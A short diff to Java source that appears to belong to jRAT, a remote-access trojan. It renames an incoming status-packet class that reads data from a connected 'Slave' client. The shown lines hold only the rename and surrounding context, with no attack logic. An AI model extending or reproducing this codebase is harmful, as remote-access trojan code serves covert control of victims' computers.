@@ -4,7 +4,7 @@ import java.io.DataInputStream;
 
 import se.jrat.client.Slave;
 
-public class Packet13Status extends AbstractIncomingPacket {
+public class Packet2Status extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
